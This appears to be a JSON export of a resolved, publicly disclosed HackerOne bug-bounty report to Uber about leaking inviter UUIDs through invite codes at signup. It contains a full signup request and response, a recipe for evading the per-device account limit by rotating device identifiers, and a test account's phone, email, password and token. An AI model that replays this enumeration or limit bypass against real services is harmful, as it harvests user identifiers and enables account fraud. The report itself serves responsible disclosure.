{
  "id": 145150,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNDUxNTA=",
  "url": "https://hackerone.com/reports/145150",
  "title": "Bulk UUID enumeration via invite codes",
  "state": "Closed",
  "substate": "resolved",
  "readable_substate": "Resolved",
  "created_at": "2016-06-16T11:31:28.594Z",
  "submitted_at": "2016-06-16T11:31:28.594Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "vijay_kumar",
    "url": "/vijay_kumar",
    "profile_picture_urls": {
      "small": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/nzfy25gsabz9y3osiunejpyuzv2c/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98?response-content-disposition=inline%3B%20filename%3D%22default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png%22%3B%20filename%2A%3DUTF-8%27%27default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ2JWCBEGQ%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T121358Z&X-Amz-Expires=1504&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQC%2FUOBUX4k3hk3E%2Be6snO9LPeTekkyoO2NoMEQpFLXEBwIhAJtkXXn5eL0ikTtvqv%2F2fgGtuhZUPvLulWFuhYzEiLfuKrAFCG8QAxoMMDEzNjE5Mjc0ODQ5Igx%2BsOWizWfx0tzigpsqjQUuFNaEEdzMHGeLBy6s%2Bkoye8hS0hWPfE4WrdAunw9kpHYBx3YQZH%2FutD5pqzkJ0%2FpSWNbJpNfcWoCwQfdsMFN%2F3JTaogDPpUe%2FUAwScnqabVUL9jhgbAfxzoi6vdePXcWwC3rPpDdJZOWII30adweaKN3r73pvMjzWQOzrFwQRQ2qqkd6ueKTpUI%2Fv4YvwK2UEvpnWlXVfdWza8QTDZ%2BVAhjMIgYhtNwiWvsrwTlWirEbz9gqK%2FzOzBvugRZ98k6lTo4fLL9%2F23SfytoJCVdDDIwGtU9XGeEckRTNfnCgQgTT%2FZaoU54aipxAM0Bk2%2FOy9qyQgNo%2Bc4a%2BtxjohyY6lmRwPOUw0Pc6tciCZLAfzTSCwKGLeWeoHYecu2a8TObYqts0FTVzlDxQi0dXbDKcGkreaslLTdMzFIWj7k%2FvKf0zZ7SIjn5wlEWYmpN6UNwCGxRlHEIiWuB874izqCmy7qw9LCJb0ZLpm1%2FSPsUBljWnIWg8YKhR5G%2BlRT4AnTpGmbQ1duSnA4UOAFqFF9ooGKFMwleUudDqIrFYn0NrgGkKuZ0FyHukrzdoftt2m1CLmNvKjrzoE0ES2uqov8Tj9QQRIEQFjtg7I5ZpK9maHPpHk4CLN0O0Y4rauWiSIHQif1cMtqKARg%2BcskG0crI1mZl2Me%2BZZ8g9Jr6A9TO%2BG6B%2BAuHvyOlBnEQo9ApBQ4g3JZp7uSyRCH7wyxu5avVfWBP0kR4X6PVPNS2njxovFuRYhrsoaOxr5qCj6HG4uUNqbsm3ZbdAMFLxXzT5KEhmDSNZSAkWhXSd3CbLn6PLU3H1wZKL%2BRTr3YWP6V%2BPBJOgG3%2F1%2FtAW8La4mIXOfKOuKrxAT6UJ%2F3ezUbaPUnzCVlKyuBjqwAYUQRBNZktTPJUzRxaZYc7FlEKaYCo56JYwdR1VwuNznpSAuwrJmZ8ZvnXNFJPLlJdcNccsiJ5fTCzfeWcf9BpY1wSj3EzyoYZKwzbfX52pXogACNTVaQkOfGOJAlQQWdAcneFKpYzmbv463sdm5nxdVudTTpGAS2KhfaCeHX8P%2BR4cx6Nfp5GhC4hDj4dSg1VosbQKNMaotjyBFcyuRuboj987f2kN16pdIanTNBi4a&X-Amz-SignedHeaders=host&X-Amz-Signature=57809cee5233842bfc9fff787b60bbaaef6b6e7e71636ff307b2f003dbd2c929"
    },
    "is_me?": false,
    "cleared": true,
    "verified": true,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 314,
    "url": "https://hackerone.com/uber",
    "handle": "uber",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/000/314/24ea21370a71b18eafb5722d5855825ab622b5dd_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/314/24ea21370a71b18eafb5722d5855825ab622b5dd_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "Uber",
      "twitter_handle": "",
      "website": "https://www.uber.com",
      "about": ""
    }
  },
  "has_bounty?": true,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": true,
  "disclosed_at": "2016-09-08T17:15:33.211Z",
  "bug_reporter_agreed_on_going_public_at": "2016-08-09T17:15:23.134Z",
  "team_member_agreed_on_going_public_at": null,
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "It is possible to enumerate UUID via invite code. During signup if we enter invite code then ```create``` request's response contains ```inviter_uuid``` . As invite codes are public  so attacker can easily enumerate  bulk UUID . \n\nHere is sample request :-\n\n```\nPOST /signup/clients/create HTTP/1.1\nX-Uber-RedirectCount: 0\nX-Uber-DCURL: https://cn-geo1.uber.com/\nUser-Agent: client/android/3.104.5\nX-Uber-Origin: android-client\nX-Uber-Device-Location-Latitude: 26.894606\nX-Uber-Device-Location-Longitude: 75.7562847\nContent-Type: application/json; charset=UTF-8\nHost: cn-geo1.uber.com\nConnection: Keep-Alive\nAccept-Encoding: gzip\nContent-Length: 1809\n\n{\n\t\"deviceData\": {\n\t\t\"androidId\": \"b3f675hc5e15531\",\n\t\t\"version\": \"3.104.5\",\n\t\t\"batteryStatus\": \"discharging\",\n\t\t\"carrier\": \"\",\n\t\t\"carrierMcc\": \"404\",\n\t\t\"carrierMnc\": \"59\",\n\t\t\"simSerial\": \"9915921251419234722\",\n\t\t\"cpuAbi\": \"armeabi, armeabi-v7a\",\n\t\t\"phoneNumber\": \"\",\n\t\t\"deviceIds\": {\n\t\t\t\"authId\": \"k361075b11131493a6061925\",\n\t\t\t\"permId\": \"k973d2529d728186b9063522cb48d74b\",\n\t\t\t\"deviceImei\": \"851639131157164\"\n\t\t},\n\t\t\"md5\": \"184ec02b309a23dedfc90f6bfe0dfab\",\n\t\t\"ipAddress\": \"192.168.0.171\",\n\t\t\"deviceModel\": \"HM NOTE 1LTE\",\n\t\t\"deviceOsName\": \"Android\",\n\t\t\"deviceOsVersion\": \"4.4.4\",\n\t\t\"imsi\": \"50459415423472\",\n\t\t\"batteryLevel\": 0.81,\n\t\t\"deviceAltitude\": 0.0,\n\t\t\"deviceLongitude\": 75.7562847,\n\t\t\"deviceLatitude\": 26.894606,\n\t\t\"locationServiceEnabled\": true,\n\t\t\"mockGpsOn\": false,\n\t\t\"emulator\": false,\n\t\t\"rooted\": true,\n\t\t\"course\": 0.0,\n\t\t\"speed\": 0.0,\n\t\t\"unknownSources\": false,\n\t\t\"horizontalAccuracy\": 24.0,\n\t\t\"wifiConnected\": true\n\t},\n\t\"device_ids\": {\n\t\t\"device_imei\": \"51639131957164\",\n\t\t\"googleAdvertisingId\": \"anba81e-ecde-419a-a1c4-0eb0f6768887\"\n\t},\n\t\"altitude\": 0.0,\n\t\"horizontal_accuracy\": 24.0,\n\t\"device_mobile_country_iso2\": \"in\",\n\t\"password\": \"vijay\",\n\t\"version\": \"3.104.5\",\n\t\"course\": 0.0,\n\t\"device_os\": \"4.4.4\",\n\t\"signup_form\": \"android\",\n\t\"first_name\": \"Test\",\n\t\"device_model\": \"HM NOTE 1LTE\",\n\t\"device_mobile_digits\": \"\",\n\t\"signup_session_id\": \"f8eb7f0-5ab5-433b-aa97-88d434fe2224\",\n\t\"longitude\": 75.7562847,\n\t\"app\": \"client\",\n\t\"promotion_code\": \"uber48\",\n\t\"mobile_country_iso2\": \"IN\",\n\t\"device_serial_number\": \"9CAE0F2D091\",\n\t\"speed\": 0.0,\n\t\"epoch\": 1466074494001,\n\t\"device_id\": \"r9ee4b0668ccbccdbb454c3c7791ee47\",\n\t\"email\": \"testh1vijay5@gmail.com\",\n\t\"last_name\": \"Account\",\n\t\"device\": \"android\",\n\t\"token_type\": \"cash\",\n\t\"latitude\": 26.894606,\n\t\"language\": \"en_US\",\n\t\"mobile\": \"97558 47368\"\n}\n```\n\nand response is-\n\n```\n{\n\t\"rider_referral_url\": \"https://www.uber.com/invite/testa207ue\",\n\t\"last_name\": \"Account\",\n\t\"driver_referral_url\": \"https://partners.uber.com/drive/?invite_code=testa207ue\",\n\t\"national_id\": null,\n\t\"creationtime\": \"2016-06-16T11:03:03.997628+00:00\",\n\t\"give_get_amount\": \"₹50\",\n\t\"is_super_admin\": false,\n\t\"has_confirmed_mobile\": false,\n\t\"give_get_description\": {\n\t\t\"fine_print\": \"Every time a new Uber user signs up with your invite code, they’ll get ₹ 50 off each of their first 2 rides. \\nOnce they take their first ride, you'll automatically get ₹ 50 off each of your next 2 rides. \\nDiscounts apply automatically in your country and expire 3 months from their issue date. Offer not valid for uberTAXI.\",\n\t\t\"giver_promotion\": {\n\t\t\t\"headline\": \"Get ₹ 50 off each of your next 2 rides\",\n\t\t\t\"promotion_value_string\": \"₹ 50 off of next 2 rides\",\n\t\t\t\"details\": \"They get ₹ 50 off each of their first 2 rides and you will too, after their first ride.\",\n\t\t\t\"award_details\": {\n\t\t\t\t\"per_trip_max_value\": \"50.000\",\n\t\t\t\t\"max_value_amount\": \"100.000\",\n\t\t\t\t\"per_trip_value\": \"50.000\",\n\t\t\t\t\"type\": \"GiveGetTripCreditPromotion\",\n\t\t\t\t\"trips\": 2,\n\t\t\t\t\"currency_code\": \"INR\"\n\t\t\t}\n\t\t},\n\t\t\"invite_code\": \"testa207ue\",\n\t\t\"receiver_promotion\": {\n\t\t\t\"message_body\": \"I’m giving you ₹ 50 off each of your first 2 Uber rides. To accept, use code ‘testa207ue’ to sign up. Enjoy! Details: https://www.uber.com/invite/testa207ue\",\n\t\t\t\"headline\": \"Get ₹ 50 off each of your first 2 rides\",\n\t\t\t\"promotion_value_string\": \"₹ 50 off first 2 rides\",\n\t\t\t\"message_subject\": \"₹ 50 off each of your first 2 Uber rides\",\n\t\t\t\"award_details\": {\n\t\t\t\t\"per_trip_max_value\": \"50.000\",\n\t\t\t\t\"max_value_amount\": \"100.000\",\n\t\t\t\t\"per_trip_value\": \"50.000\",\n\t\t\t\t\"type\": \"GiveGetTripCreditPromotion\",\n\t\t\t\t\"trips\": 2,\n\t\t\t\t\"currency_code\": \"INR\"\n\t\t\t},\n\t\t\t\"details\": \"Get ₹ 50 off your first 2 Uber rides with invite code 'testa207ue'. Enjoy! Download the app: https://www.uber.com/invite/testa207ue\"\n\t\t}\n\t},\n\t\"referral_code\": \"testa207ue\",\n\t\"confirm_mobile_exempt\": false,\n\t\"confirm_mobile\": false,\n\t\"last_selected_payment_google_wallet_uuid\": null,\n\t\"first_name\": \"Test\",\n\t\"signup_promo_uuid\": \"6c94e187-fafe-45b3-af8b-a82fa7136e5c\",\n\t\"has_to_opt_in_sms_notifications\": false,\n\t\"uuid\": \"05faf97c-ad8f-4986-b504-4ebc63f80c29\",\n\t\"mobile_local\": \"+91 97558 47368\",\n\t\"confirm_email\": false,\n\t\"signup_promo_type\": \"GiveGetTripCreditPromotion\",\n\t\"picture_url\": \"https://d1w2poirtb3as9.cloudfront.net/default.jpeg\",\n\t\"country_id\": 77,\n\t\"language_id\": 1,\n\t\"promotion_code_id\": 534264309,\n\t\"last_selected_payment_profile_uuid\": \"073f4714-f999-4253-a3af-2895c783001e\",\n\t\"role\": \"client\",\n\t\"location\": \"00000\",\n\t\"has_confirmed_email\": false,\n\t\"is_restricted\": false,\n\t\"client_promotions\": [{\n\t\t\"display_date\": \"September 15, 2016\",\n\t\t\"code\": \"GG_INVITEE_zshtj4kvue\",\n\t\t\"redemption_count\": 0,\n\t\t\"updated_at\": \"2016-06-16T11:03:04+00:00\",\n\t\t\"promotion_id\": null,\n\t\t\"deleted_at\": null,\n\t\t\"id\": 314578103,\n\t\t\"revoked_at\": null,\n\t\t\"auto_applied\": false,\n\t\t\"uuid\": \"d56807ec-166b-42bc-8784-234e74b90e55\",\n\t\t\"display_location\": \"India\",\n\t\t\"promotion_code_id\": null,\n\t\t\"is_valid\": true,\n\t\t\"short_description\": null,\n\t\t\"display_discount\": \"₹ 150 OFF\",\n\t\t\"description\": \"Free trip up to ₹150 from Данила\",\n\t\t\"expires_at\": \"2016-09-15T11:03:04+00:00\",\n\t\t\"applied_by_client_uuid\": \"05faf97c-ad8f-4986-b504-4ebc63f80c29\",\n\t\t\"promotion_uuid\": \"6c94e187-fafe-45b3-af8b-a82fa7136e5c\",\n\t\t\"promotion_code_uuid\": \"d48cc4d3-d02c-4e61-98d1-e109f52e5b2f\",\n\t\t\"custom_user_activation_message\": null,\n\t\t\"ends_at\": \"9999-12-31T23:59:59+00:00\",\n\t\t\"client_uuid\": \"05faf97c-ad8f-4986-b504-4ebc63f80c29\",\n\t\t\"starts_at\": \"2016-02-15T18:30:00+00:00\",\n\t\t\"created_at\": \"2016-06-16T11:03:04+00:00\"\n\t}],\n\t\"email\": \"testh1vijay5@gmail.com\",\n\t\"username\": \"testh1vijay5@gmail.com\",\n\t\"picture\": null,\n\t\"is_autoban_whitelisted\": false,\n\t\"mobile_country_iso2\": \"IN\",\n\t\"gratuity\": \"0.2\",\n\t\"claimed_mobile_local\": null,\n\t\"email_confirm\": false,\n\t\"phone_number_full\": \"+919755847368\",\n\t\"banned\": false,\n\t\"mobile_country_id\": 77,\n\t\"promotion_code_uuid\": \"2ca62e26-06f7-48dc-bf8a-441602eaf91d\",\n\t\"tenancy\": \"uber/production\",\n\t\"mobile_country_code\": \"+91\",\n\t\"credit_balances\": {},\n\t\"trip_credit_balance_strings\": [],\n\t\"is_tester\": false,\n\t\"nickname\": \"testh1vijay5@gmail.com\",\n\t\"was_upgraded\": false,\n\t\"signup_promo_id\": 332867,\n\t\"mobile\": \"9755847368\",\n\t\"has_american_mobile\": false,\n\t\"has_opted_in_sms_marketing\": false,\n\t\"token\": \"e42f75a88fa243cdecfd2cef243f0c4c\",\n\t\"meta\": {},\n\t\"referral_url\": \"https://www.uber.com/invite/testa207ue\",\n\t\"is_admin\": false,\n\t\"is_temporary_admin\": false,\n\t\"inviter_uuid\": \"a5efac50-b706-47c7-997d-c992b85095ee\",\n\t\"last_trip_uuid\": null\n}\n```\n\nSecond last line of response contains ```inviter_uuid``` .\nPlease note that uber only allow 3 account per device if we choose payment method as cash. But we can bypass it by taking androidId,simSerial,imsi,googleAdvertisingId,signup_session_id  in variable during Attack.\nI  tested with 45 requests and all request were successful. \n\nThanks",
  "weakness": {
    "id": 18,
    "name": "Information Disclosure"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": "2016-09-08T17:15:23.372Z",
  "allow_singular_disclosure_after": -234471514.92395163,
  "singular_disclosure_allowed": true,
  "vote_count": 11,
  "voters": [
    "michiel",
    "yaworsk",
    "ngalog",
    "vijay_kumar",
    "jens",
    "fantam1",
    "jbbbkj",
    "spetr0x",
    "dyabla",
    "mozol",
    "and 1 more..."
  ],
  "structured_scope": null,
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
